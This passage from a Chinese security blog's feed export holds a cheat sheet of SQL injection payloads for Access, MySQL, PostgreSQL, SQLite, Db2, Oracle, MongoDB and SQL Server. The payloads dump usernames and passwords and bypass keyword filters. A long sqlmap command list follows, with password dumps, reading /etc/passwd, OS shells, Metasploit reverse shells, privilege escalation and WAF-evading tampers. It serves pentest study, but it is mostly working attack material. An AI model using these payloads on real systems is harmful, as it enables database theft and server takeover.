<h1 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h1><h2 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h2><p>直接上传PHP文件，发现只能上传图片格式</p>
<p><img src="/image/upload-labs-%E9%80%9A%E5%85%B3WP/image-20210729150848554.png" alt="image-20210729150848554"></p>
<p>抓包看看：</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>File Upload</category>
      </categories>
      <tags>
        <tag>Web Security</tag>
        <tag>Write-up</tag>
        <tag>File Upload Vulnerability</tag>
      </tags>
  </entry>
  <entry>
    <title>不同数据库的SQL注入集合</title>
    <url>/2021/06/06/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/</url>
    <content><![CDATA[<h1 id="ACCESS数据库注入（asp）"><a href="#ACCESS数据库注入（asp）" class="headerlink" title="ACCESS数据库注入（asp）"></a>ACCESS数据库注入（asp）</h1><span id="more"></span>

<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p><strong>一般用于ASP网站</strong></p>
<p><strong>access数据库结构：table, column, data</strong></p>
<p><strong>access数据库一般格式：xxx.mdb 数据库文件</strong></p>
<h2 id="注入语法"><a href="#注入语法" class="headerlink" title="注入语法"></a>注入语法</h2><p>猜解table,column的名字需要用到字典</p>
<p><strong>猜解列表个数</strong>：<code>order by 5;</code> -&gt; 按第五列排列，而数字表示第几个column，所以如果<code>order by 5</code>显示正常，但<code>order by 6;</code>不正常，说明这个table只有6个column.</p>
<p><strong>猜解表名：</strong><code>union select 1,2,3,4,5 from admin</code> -&gt; 看admin这个table是否存在</p>
<p><strong>猜解列名：</strong>根据页面返回的信息修改语句</p>
<p><code>union select 1,2,3,4,5,6,7,8 from news</code></p>
<p>比如在这个网站,我们猜出列表个数有八个,表名为news(只是演示,一般猜解管理员的表,如admin)<img src="/image/%E4%B8%8D%E5%90%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E9%9B%86%E5%90%88/image-20210606182256848.png" alt="image-20210606182256848"></p>
<p>通过图片我们可以看出显示出了3,4,8个位置,<strong>这时我们只需要在这三个中的任一位置进行替代，替代为猜测的列名即可</strong></p>
<p>比如在3的位置替代为password,若检测存在password这个列表，则会显示出来password明文</p>
<p><strong>偏移注入：表名获取到了（字典），但列名没获取到</strong></p>
<p>参考：<a href="https://blog.csdn.net/wxh0000mm/article/details/104451163">Access偏移注入与原理</a></p>
<p>最后查看网页源码即可</p>
<h1 id="MYSQL数据库注入"><a href="#MYSQL数据库注入" class="headerlink" title="MYSQL数据库注入"></a>MYSQL数据库注入</h1><h2 id="Phase-1-通用注入语法"><a href="#Phase-1-通用注入语法" class="headerlink" title="Phase 1: 通用注入语法"></a>Phase 1: 通用注入语法</h2><p><strong>注释符号：</strong><code>--+</code>或者<code>#</code></p>
<p><strong>猜解列表个数</strong>：<code>order by 5;</code> -&gt; 按第五列排列，而数字表示第几个column，所以如果<code>order by 5</code>显示正常，但<code>order by 6;</code>不正常，说明这个table只有6个column.</p>
<p><strong>猜解表名：</strong><code>union select 1,2,3,4,5 </code>;</p>
<p>不同于Access数据库，这里可能看不到报错的数字，所以得在前面参数处报错 如<code>.php?id=-1</code> 或者 <code>.php?id=1 and 1=2</code>或者试试换id</p>
<p><strong>在报错的数字位置替换：</strong></p>
<ul>
<li>查询数据库名: database()</li>
<li>查询数据库版本：version()</li>
<li>查询数据库用户：user()</li>
<li>查询操作系统: @@version_compile_os</li>
</ul>
<p><strong>堆叠注入绕过关键词检测：</strong></p>
<ul>
<li>‘; SET @a=HEX;prepare execsql from @a; execute execsql; </li>
</ul>
<p>若数据库名有特殊符号如(){}之类的，可以用``反引号将其扩出来</p>
<h2 id="Phase-2-根据版本继续注入"><a href="#Phase-2-根据版本继续注入" class="headerlink" title="Phase 2: 根据版本继续注入"></a>Phase 2: 根据版本继续注入</h2><h3 id="MYSQL-5-0以上版本："><a href="#MYSQL-5-0以上版本：" class="headerlink" title="MYSQL 5.0以上版本："></a>MYSQL 5.0以上版本：</h3><p><strong>information_schema.schemata</strong></p>
<ul>
<li>shcema_name 为数据库名信息</li>
</ul>
<p><strong>information_schema.tables</strong></p>
<ul>
<li>table_name 为表名信息</li>
<li>table_schema 为数据库名</li>
</ul>
<p><strong>information_schema.columns</strong></p>
<ul>
<li>column_name 为列名信息</li>
<li>table_name为表名信息</li>
</ul>
<p><strong>查表名:</strong></p>
<p><code>and 1=2 union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+</code> </p>
<p><strong>p.s:group_concat(table_name)意思说把所有表名获取出来</strong></p>
<p><strong>查列名：</strong></p>
<p><code>and 1=2 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表名&#39;--+</code></p>
<p><strong>查数据(指定表名列名)：</strong></p>
<p><code>union select 1,name,password,4 from StormGroup_member--+</code></p>
<p><code>union select 1,group_concat(concat_ws(&#39;:&#39;,name,password)),3,4 from StormGroup_member--+</code></p>
<p><code>union select 1,group_concat(name),group_concat(password),3,4 from StormGroup_member--+</code></p>
<h3 id="MYSQL-5-0以下版本："><a href="#MYSQL-5-0以下版本：" class="headerlink" title="MYSQL 5.0以下版本："></a>MYSQL 5.0以下版本：</h3><p>可进行暴力猜解、配合文件读取尝试获取列名表名</p>
<p>MYSQL 4.0: 读取源代码</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>####正则注入</p>
<p>正确返回1，错误返回0，可搭配if使用</p>
<p><code>select user() regexp &#39;^[a-z]&#39;; -- 猜解第一个字符，为r</code></p>
<p><code>select user() regexp &#39;^r[a-z]&#39;; -- 猜解第二个字符，为o</code></p>
<p><code>select user() regexp &#39;^ro[a-z]&#39;; -- 猜解第三个字符，为o</code></p>
<p><code>select user() regexp &#39;^roo[a-z]&#39;; -- 猜解第四个字符，为t</code></p>
<p><code>...</code></p>
<h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><p>数据库需要开启报错提示</p>
<h4 id="floor-报错注入"><a href="#floor-报错注入" class="headerlink" title="floor()报错注入"></a>floor()报错注入</h4><p><code>select 1,count(*),concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a %23</code></p>
<p><strong>关键表被禁用：</strong></p>
<p><code>select 1,count(*),concat(0x3a,0x3a,(version()),0x3a,0x3a,floor(rand(0)*2))a from (select null)b group by a %23;</code></p>
<p><strong>rand被禁用：</strong>可使用用户变量来报错</p>
<p><code>select min(@a:=1) from information_schema.tables group by concat(user(),@a:=(@a+1)%2);</code></p>
<p><strong>补充floor()报错注入原理：待续</strong></p>
<h4 id="UpdateXML-报错注入"><a href="#UpdateXML-报错注入" class="headerlink" title="UpdateXML 报错注入"></a>UpdateXML 报错注入</h4><ul>
<li><p>适用于mysql5.1.5+,最长32位</p>
</li>
<li><p>updatexml(a,<strong>b</strong>,c); </p>
<ul>
<li>a: XML文档对象的名称-&gt;string</li>
<li><strong>b: Xpath格式的string,若不符合该格式则报错</strong></li>
<li>c: new value -&gt; String</li>
</ul>
</li>
</ul>
<p><code>and updatexml(1,concat(0x7e,(payload)),1);</code></p>
<h4 id="Extractvalue-报错注入"><a href="#Extractvalue-报错注入" class="headerlink" title="Extractvalue 报错注入"></a>Extractvalue 报错注入</h4><ul>
<li>适用于mysql5.1.5+,最长32位</li>
<li>ExtractValue(xml_flag, <strong>xpath_expr</strong>)<ul>
<li>xml_flag: 传入目标xml文档</li>
<li><strong>xpath_expr</strong>: <strong>Xpath格式的查找路径，若不符合该格式则报错</strong></li>
<li>用法：获取xml_flag这个文档下xpath_expr里的东西</li>
</ul>
</li>
</ul>
<p><code>and extractvalue(1,concat(0x7e,(payload)))</code></p>
<h1 id="PostgreSQL注入（一般和PHP搭配）"><a href="#PostgreSQL注入（一般和PHP搭配）" class="headerlink" title="PostgreSQL注入（一般和PHP搭配）"></a>PostgreSQL注入（一般和PHP搭配）</h1><p>参考：<a href="https://www.cnblogs.com/she11s/p/12326629.html">Sql注入之Postgresql</a></p>
<p><strong>PostgreSQL注入和MYSQL很像，只是语句有些不同</strong></p>
<p><strong>判断：and 1=1 and 1=2</strong></p>
<p><strong>回显位置：union select null, ‘1’,’1’,null</strong></p>
<p><strong>查询表名、列名的时候每次只会显示一个，所以可以在后面加上 <code>limit 1 offset 0</code> ，通过增加offset可以依次得到剩下的表名、列名</strong></p>
<h1 id="Sqlite注入"><a href="#Sqlite注入" class="headerlink" title="Sqlite注入"></a>Sqlite注入</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>sqlite中会有一个隐藏表 <strong>sqlite_master</strong></p>
<h2 id="注入语句"><a href="#注入语句" class="headerlink" title="注入语句"></a>注入语句</h2><p><strong>查询列表个数</strong>：<code>order by 4</code></p>
<p><strong>获取表的信息</strong>：<code>union select 1,name,sql,4 from sqlite_master</code></p>
<p><code>sql</code>是数据库被创建时的执行语句</p>
<p><strong>获取数据：</strong><code>union select 1,name,password,4 from 获取的表名</code></p>
<h1 id="Db2注入"><a href="#Db2注入" class="headerlink" title="Db2注入"></a>Db2注入</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p><strong>tabschema</strong>：数据库名 </p>
<p><strong>current schema</strong>：数据库名的列名</p>
<p><strong>table_name</strong>：表名 </p>
<p><strong>tabname</strong>：表名的列名</p>
<p><strong>column_name</strong>：列名的列名</p>
<p><strong>sysibm.sysdummy1</strong> 记录数据库名的信息</p>
<p><strong>syscat.tables</strong>：记录表名的信息</p>
<p><strong>sysibm.columns</strong>：记录列名的信息</p>
<h2 id="注入语法-1"><a href="#注入语法-1" class="headerlink" title="注入语法"></a>注入语法</h2><p><strong>1、猜数</strong></p>
<p><code>order by 4</code></p>
<p><code>union select 1,2,3,4 from sysibm.systables</code></p>
<p><strong>2、爆库：</strong></p>
<p><code>union select 1,2,current schema,4 from sysibm.sysdummy1</code></p>
<p><strong>3、爆表：</strong></p>
<p><code>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 0,1</code></p>
<p><code>union select 1,2,tabname,4 from syscat.tables where tabschema=current schema limit 1,1</code></p>
<p><strong>4、爆列：</strong></p>
<p><code>union select 1,2,column_name,4 from sysibm.columns where table_schema=current schema and table_name=&#39;GAME_CHARACTER&#39; limit 0,1</code></p>
<p><strong>5、爆数据：</strong></p>
<p><code>union select 1,name,password,4 from GAME_CHARACTER limit 0,1</code></p>
<p><code>union select 1,name,password,4 from GAME_CHARACTER limit 1,1</code></p>
<h1 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p><strong>参考：</strong></p>
<p><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html"><a href="https://www.cnblogs.com/peterpan0707007/p/8242119.html">【实战】Oracle注入总结</a></a></p>
<p><a href="https://blog.csdn.net/qq_35569814/article/details/100517122">Oracle注入</a></p>
<p><strong>all_tables</strong> 查询出所有的表</p>
<p><strong>user_tables</strong> 查询出当前用户的表</p>
<p><strong>all_tab_columns</strong> 查询出所有的字段</p>
<p><strong>user_tab_columns</strong>  查询出当前用户的字段</p>
<p><strong>v$version</strong> 查版本</p>
<p><strong>大小写:在Oracle中： 双引号的作用是：假如建立对象的时候，对象名、字段名加双引号，则示意Oracle将严格区分大小写，否则Oracl都默认大写。 而单引号则示意：这个加了单引号的字段是一个字类似字符串，并不区分大小写。 当指定字符串文本时，必须用单引号将字符串文本引住</strong></p>
<p><strong>注释符号：–</strong></p>
<h2 id="注入语句-1"><a href="#注入语句-1" class="headerlink" title="注入语句"></a>注入语句</h2><p><strong>1.查询个数</strong></p>
<p>order by 2</p>
<p><strong>2.查询表名格式</strong></p>
<p><code>union select null,null from dual</code></p>
<p><code>union select &#39;null&#39;,null from dual</code></p>
<p><code>union select &#39;null&#39;,&#39;null&#39; from dual</code></p>
<p><strong>3.查询获取表名(筛选,搜索)</strong></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1) from dual</code></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1) from dual</code></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1 and table_name not in &#39;LOGMNR_SESSION_EVOLVE$&#39;) from dual</code></p>
<p><code>union select &#39;1&#39;,(select table_name from user_tables where rownum=1 and table_name like &#39;%user%&#39;) from dual</code></p>
<p><strong>4.查询获取列名</strong></p>
<p><code>union select &#39;1&#39;,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;sns_users&#39;) from dual</code></p>
<p><code>union select &#39;1&#39;,(select column_name from user_tab_columns where rownum=1 and table_name=&#39;sns_users&#39; and column_name not in &#39;USER_NAME&#39;)  from dual</code></p>
<p><strong>5.获取指定表名列名数据</strong></p>
<p><code>union select user_name,user_pwd from &quot;sns_users&quot;</code></p>
<p><code>union select user_name,user_pwd from &quot;sns_users&quot; where user_name&lt;&gt;&#39;hu&#39;</code></p>
<p><code>union select user_name,user_pwd from &quot;sns_users&quot; where user_name=&#39;mozhe&#39;</code></p>
<h1 id="Mongodb注入"><a href="#Mongodb注入" class="headerlink" title="Mongodb注入"></a>Mongodb注入</h1><h2 id="介绍-4"><a href="#介绍-4" class="headerlink" title="介绍"></a>介绍</h2><p>Mongodb以json形式传参，所以注入的时候需要根据code来分析</p>
<h2 id="注入语法-2"><a href="#注入语法-2" class="headerlink" title="注入语法"></a>注入语法</h2><p><strong>1.获取回显数字</strong></p>
<p><code>&#39;&#125;); return (&#123;title:1,content:&#39;2</code></p>
<p><strong>2.爆库</strong></p>
<p>db返回的是数组，库名，需要用tojson转换为字符串</p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db),content:&#39;2</code></p>
<p><strong>3.爆表</strong></p>
<p>db.getCollectionNames()返回的是数组，需要用tojson转换为字符串</p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db.getCollectionNames()),content:&#39;2</code></p>
<p><strong>4.爆列及数据</strong></p>
<p><strong>db.Authority_confidential</strong>是当前用的集合（表），</p>
<p>find函数用于查询，0是第一条数据</p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[0]),content:&#39;1</code></p>
<p><code>&#39;&#125;); return (&#123;title:tojson(db.Authority_confidential.find()[1]),content:&#39;1</code></p>
<h1 id="Sybase-Sqlserver注入"><a href="#Sybase-Sqlserver注入" class="headerlink" title="Sybase/Sqlserver注入"></a>Sybase/Sqlserver注入</h1><p><strong>1.猜个数</strong></p>
<p><code>order by 4</code></p>
<p><strong>2.猜显位</strong>: <strong>改的位置显示正常则说明该位置为显位</strong></p>
<p><code>union all select &#39;null&#39;,null,null,null</code></p>
<p><code>union all select null,&#39;null&#39;,null,null 显示null证明显示位为2</code></p>
<p><code>union all select null,null,&#39;null&#39;,null</code></p>
<p><code>union all select null,null,null,&#39;null&#39;</code></p>
<p><strong>3.猜库名</strong></p>
<p><code>union all select null,db_name(),null,null</code></p>
<p><code>union all select null,db_name(1),null,null</code></p>
<p><code>union all select null,db_name(2),null,null</code></p>
<p><strong>4.猜表名</strong>：<strong>在数据库名后加上.dbo.sysobjects</strong></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;&#39;Deepthroat_login&#39;</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.sysobjects where name&lt;&gt;&#39;Deepthroat_login&#39; and name&lt;&gt;&#39;notice&#39;</code></p>
<p><strong>5.猜列名</strong></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat.dbo.syscolumns where id=object_id(&#39;Deepthroat_login&#39;)</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id(&#39;Deepthroat_login&#39;) and name&lt;&gt;&#39;id&#39;</code></p>
<p><code>union all select null,name,null,null from mozhe_Deepthroat..syscolumns where id=object_id(&#39;Deepthroat_login&#39;) and name&lt;&gt;&#39;id&#39; and name&lt;&gt;&#39;name&#39;</code></p>
<p><strong>6.获取数据</strong></p>
<p><code>union all select null,name,null,null from Deepthroat_login</code></p>
<p><code>union all select null,password,null,null from Deepthroat_login</code></p>
<p><code>union all select null,password,null,null from Deepthroat_login where name&lt;&gt;&#39;zhang&#39;</code></p>
<p><code>union all select null,password,null,null from Deepthroat_login where name=&#39;mozhe&#39;</code></p>
<h1 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h1><h2 id="命令参数"><a href="#命令参数" class="headerlink" title="命令参数"></a>命令参数</h2><p>-u  #注入点 </p>
<p>-f  #指纹判别数据库类型 </p>
<p>-b  #获取数据库版本信息 </p>
<p>-p  #指定可测试的参数(?page=1&amp;id=2 -p “page,id”) </p>
<p>-D “”  #指定数据库名 </p>
<p>-T “”  #指定表名 </p>
<p>-C “”  #指定字段 </p>
<p>-s “”  #保存注入过程到一个文件,还可中断，下次恢复在注入(保存：-s “xx.log”　　恢复:-s “xx.log” –resume) </p>
<p>-r post.txt #把post的内容放在post.txt 直接用这个进行post注入</p>
<p>–level=(1-5) #要执行的测试水平等级，默认为1 </p>
<p>–risk=(0-3)  #测试执行的风险等级，默认为1 </p>
<p>–time-sec=(2,5) #延迟响应，默认为5 </p>
<p>–data “” #通过POST发送数据 </p>
<p>–columns        #列出字段 </p>
<p>–current-user   #获取当前用户名称 </p>
<p>–current-db     #获取当前数据库名称 </p>
<p>–users          #列数据库所有用户 </p>
<p>–passwords      #数据库用户所有密码 </p>
<p>–privileges     #查看用户权限(–privileges -U root) </p>
<p>-U               #指定数据库用户 </p>
<p>–dbs            #列出所有数据库 </p>
<p>–tables -D “”   #列出指定数据库中的表 </p>
<p>–columns -T “user” -D “mysql”#列出mysql数据库中的user表的所有字段</p>
<p>–dump-all            #列出所有数据库所有表 </p>
<p>–exclude-sysdbs      #只列出用户自己新建的数据库和表 </p>
<p>–dump -T “” -D “” -C “”   #列出指定数据库的表的字段的数据(–dump -T users -D master -C surname) </p>
<p>–dump -T “” -D “” –start 2 –top 4  # 列出指定数据库的表的2-4字段的数据 </p>
<p>–dump -C “ “ #列出指定column的字段</p>
<p>–dbms    #指定数据库(MySQL,Oracle,PostgreSQL,Microsoft SQL Server,Microsoft Access,SQLite,Firebird,Sybase,SAP MaxDB) </p>
<p>–os      #指定系统(Linux,Windows) </p>
<p>-v  #详细的等级(0-6)     0：只显示Python的回溯，错误和关键消息。 </p>
<p>​    1：显示信息和警告消息。 </p>
<p>​    2：显示调试消息。 </p>
<p>​    3：有效载荷注入。 </p>
<p>​    4：显示HTTP请求。 </p>
<p>​    5：显示HTTP响应头。 </p>
<p>​    6：显示HTTP响应页面的内容 </p>
<p>–privileges  #查看权限 </p>
<p>–is-dba      #是否是数据库管理员 </p>
<p>–roles       #枚举数据库用户角色 </p>
<p>–udf-inject  #导入用户自定义函数（获取系统权限） </p>
<p>–union-check  #是否支持union 注入 </p>
<p>–union-cols #union 查询表记录 </p>
<p>–union-test #union 语句测试 </p>
<p>–union-use  #采用union 注入 </p>
<p>–union-tech orderby #union配合order by </p>
<p>–data “” #POST方式提交数据(–data “page=1&amp;id=2”) </p>
<p>–cookie “用;号分开”      #cookie注入(–cookies=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low”) –referer “”     #使用referer欺骗(–referer “http://“) </p>
<p>–user-agent “”  #自定义user-agent </p>
<p>–proxy “<a href="http://127.0.0.1:8118&quot;">http://127.0.0.1:8118&quot;</a> #代理注入 </p>
<p>–string=””    #指定关键词,字符串匹配. </p>
<p>–threads 　　  #采用多线程(–threads 3) </p>
<p>–sql-shell    #执行指定sql命令 </p>
<p>–sql-query    #执行指定的sql语句(–sql-query “SELECT password FROM mysql.user WHERE user = ‘root’ LIMIT 0, 1” ) </p>
<p>–file-read    #读取指定文件 </p>
<p>–file-write   #写入本地文件(–file-write /test/test.txt –file-dest /var/www/html/1.txt;将本地的test.txt文件写入到目标的1.txt) </p>
<p>–file-dest    #要写入的文件绝对路径 </p>
<p>–os-cmd=id    #执行系统命令 </p>
<p>–os-shell     #系统交互shell </p>
<p>–os-pwn       #反弹shell(–os-pwn –msf-path=/opt/framework/msf3/) </p>
<p>–msf-path=    #matesploit绝对路径(–msf-path=/opt/framework/msf3/) </p>
<p>–os-smbrelay  # </p>
<p>–os-bof       # </p>
<p>–reg-read     #读取win系统注册表 </p>
<p>–priv-esc     # </p>
<p>–time-sec=    #延迟设置 默认–time-sec=5 为5秒 -p “user-agent” –user-agent “sqlmap/0.7rc1 (<a href="http://sqlmap.sourceforge.net)&quot;/">http://sqlmap.sourceforge.net)&quot;</a>  #指定user-agent注入 </p>
<p>–eta          #盲注 /pentest/database/sqlmap/txt/common-columns.txt　　字段字典　　　 </p>
<p>common-outputs.txt </p>
<p>common-tables.txt      表字典 </p>
<p>keywords.txt </p>
<p>oracle-default-passwords.txt </p>
<p>user-agents.txt </p>
<p>wordlist.txt </p>
<h2 id="常用语句"><a href="#常用语句" class="headerlink" title="常用语句 :"></a>常用语句 :</h2><p>1./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db –users –passwords –dbs -v 0 </p>
<p>2./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –passwords -U root –union-use -v 2 </p>
<p>3./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -T users -C username -D userdb –start 2 –stop 3 -v 2 </p>
<p>4./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –dump -C “user,pass”  -v 1 –exclude-sysdbs </p>
<p>5./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –sql-shell -v 2 </p>
<p>6./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-read “c:\boot.ini” -v 2 </p>
<p>7./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –file-write /test/test.txt –file-dest /var/www/html/1.txt -v 2 </p>
<p>8./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-cmd “id” -v 1 </p>
<p>9./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-shell –union-use -v 2 </p>
<p>10./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path=/opt/framework/msf3 –priv-esc -v 1 </p>
<p>11./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-pwn –msf-path=/opt/framework/msf3 -v 1 </p>
<p>12./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –os-bof –msf-path=/opt/framework/msf3 -v 1 </p>
<p>13./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –reg-add –reg-key=”HKEY_LOCAL_NACHINE\SOFEWARE\sqlmap” –reg-value=Test –reg-type=REG_SZ –reg-data=1 </p>
<p>14./sqlmap.py -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -b –eta </p>
<p>15./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot;</a> -p id –prefix “‘)” –suffix “AND (‘abc’=’abc”16./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/basic/get_int.php?id=1&quot;</a> –auth-type Basic –auth-cred “testuser:testpass”17./sqlmap.py -l burp.log –scope=”(www)?.target.(com|net|org)”18./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mysql/get_int.php?id=1&quot;</a> –tamper tamper/between.py,tamper/randomcase.py,tamper/space2comment.py -v 3 </p>
<p>19./sqlmap.py -u “<a href="http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;">http://192.168.136.131/sqlmap/mssql/get_int.php?id=1&quot;</a> –sql-query “SELECT ‘foo’” -v 1 </p>
<p>20./sqlmap.py -u “<a href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –common-tables -D testdb –banner </p>
<p>21./sqlmap.py -u “<a href="http://192.168.136.129/mysql/get_int_4.php?id=1&quot;">http://192.168.136.129/mysql/get_int_4.php?id=1&quot;</a> –cookie=”PHPSESSID=mvijocbglq6pi463rlgk1e4v52; security=low” –string=’xx’ –dbs –level=3 -p “uid”简单的注入流程 :</p>
<p>1.读取数据库版本，当前用户，当前数据库 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> -f -b –current-user –current-db -v 1 </p>
<p>2.判断当前数据库用户权限 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –privileges -U 用户名 -v 1 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –is-dba -U 用户名 -v 1 </p>
<p>3.读取所有数据库用户或指定数据库用户的密码 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –users –passwords -v 2 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –passwords -U root -v 2 </p>
<p>4.获取所有数据库 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dbs -v 2 </p>
<p>5.获取指定数据库中的所有表 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –tables -D mysql -v 2 </p>
<p>6.获取指定数据库名中指定表的字段 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –columns -D mysql -T users -v 2 </p>
<p>7.获取指定数据库名中指定表中指定字段的数据 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –dump -D mysql -T users -C “username,password” -s “sqlnmapdb.log” -v 2 </p>
<p>8.file-read读取web文件 </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-read “/etc/passwd” -v 2 </p>
<p>9.file-write写入文件到web </p>
<p>sqlmap -u <a href="http://www.xxxxx.com/test.php?p=2">http://www.xxxxx.com/test.php?p=2</a> –file-write /localhost/mm.php –file使用sqlmap绕过防火墙进行注入测试：</p>
<h2 id="Tamper使用"><a href="#Tamper使用" class="headerlink" title="Tamper使用"></a>Tamper使用</h2><p>参考：<a href="https://www.cnblogs.com/mark0/p/12349551.html">sqlmap之常用tamper脚本</a></p>
<p><a href="https://blog.csdn.net/qq_21500173/article/details/53648696">sqlmap 的源码学习笔记一之目录结构</a></p>
<p><strong>–tamper=xxxx.py</strong> </p>
<h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>–current-user 当前用户<br>–is-dba 是否为管理员<br>–file-read 从服务器读入<br>–file-write 从本地写入<br>–file-dest 写入目标路径<br>–sql-shell 执行 sql命令终端<br>–os-shell 执行 shell终端<br>–os-cmd=ver 自定义命令<br>–os-cmd=OSCMD//执行操作系统命令<br>–os-shell //反弹一个 osshell<br>–os-pwn //pwn，反弹 msf下的 shell或者 vnc<br>–os-smbrelay //反弹 msf下的 shell或者 vnc<br>–os-bof //存储过程缓存溢出<br>–priv-esc //数据库提权<br>–reg-read –reg-add –reg-del –reg-key<br>–reg-value –reg-data –reg-type<br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –file-read “d:/test.txt”<br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –file-write “f:/host.txt” –file-dest “D:/phpstudy/PHPTutorial/WWW/sqlilabs/1.txt” <strong>第一个write是本地的内容，第二个是destination的地址</strong><br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –sql-shell<br>select * from mysql.user<br>python sqlmap.py -u “<a href="http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;">http://127.0.0.1:8081/sqlilabs/Less-2/?id=1&quot;</a> –os-shell</p>
]]></content>
      <categories>
        <category>Web Security</category>
        <category>SQL Injection</category>
      </categories>
      <tags>
